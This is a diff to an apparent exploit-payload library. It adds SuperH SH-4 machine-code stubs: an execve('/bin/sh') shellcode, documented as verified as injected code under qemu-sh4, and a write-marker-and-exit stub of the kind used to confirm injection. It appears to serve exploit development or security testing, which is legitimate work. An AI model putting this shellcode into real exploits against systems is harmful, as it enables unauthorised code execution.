@@ -441,6 +441,48 @@ def write_marker_loongarch64(marker: bytes) -> bytes:
     return bytes(code) + marker
 
 
+def execve_binsh_sh4() -> bytes:
+    """SuperH SH-4 execve("/bin/sh", NULL, NULL) -- 12 bytes of code + "/bin/sh\\0", position-
+    independent (`mova binsh, r0` loads the PC-relative address of the string appended after the code
+    into r0). SH-4 Linux passes the syscall number in r3, args in r4/r5/r6, and traps with
+    `trapa #(0x10+nargs)` (here `trapa #0x13`, 3 args); __NR_execve=11. 16-bit little-endian
+    instructions. Verified by running the bytes as injected code under qemu-sh4: a real /bin/sh spawns
+    (the guest execve is relayed to the host, and /bin/sh is a host binary the kernel runs natively).
+    `mova` rounds PC down to a 4-byte boundary, so the stub must be placed 4-aligned (stack buffers
+    are)."""
+    return bytes.fromhex(
+        "02c7"                           # mova  binsh, r0  ; r0 -> "/bin/sh" ((PC&~3)+4+2*4 = +12)
+        "0364"                           # mov   r0, r4     ; arg0 = path
+        "00e5"                           # mov   #0, r5     ; argv = NULL
+        "00e6"                           # mov   #0, r6     ; envp = NULL
+        "0be3"                           # mov   #11, r3    ; __NR_execve
+        "13c3"                           # trapa #0x13      ; syscall (3 args)
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_sh4(marker: bytes) -> bytes:
+    """SuperH SH-4 write(1, msg, len); exit(0). Position-independent (`mova msg, r0` points r0 at the
+    marker appended after the 20-byte code); the length is patched into the `mov #len, r6` immediate
+    at code offset 6. SH-4 `mov #imm, Rn` sign-extends the 8-bit field, so the length is capped at 127
+    (markers are short). syscall# in r3, args r4/r5/r6, `trapa #(0x10+nargs)`; __NR_write=4,
+    __NR_exit=1. 16-bit little-endian. Verified as injected code under qemu-sh4."""
+    n = min(len(marker), 127)
+    code = bytearray(bytes.fromhex(
+        "01e4"                           # mov   #1, r4     ; fd = stdout
+        "04c7"                           # mova  msg, r0    ; r0 -> marker ((PC&~3)+4+4*4 = +20)
+        "0365"                           # mov   r0, r5     ; buf = &marker
+        "03e6"                           # mov   #3, r6     ; len (PATCHED below)
+        "04e3"                           # mov   #4, r3     ; __NR_write
+        "13c3"                           # trapa #0x13      ; syscall (3 args)
+        "00e4"                           # mov   #0, r4     ; exit code 0
+        "01e3"                           # mov   #1, r3     ; __NR_exit
+        "11c3"                           # trapa #0x11      ; syscall (1 arg)
+        "0900"                           # nop              ; align marker to a 4-byte boundary
+    ))
+    code[6] = n                          # mov #n, r6
+    return bytes(code) + marker
+
+
 def write_marker_aarch64(marker: bytes) -> bytes:
     """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
     marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
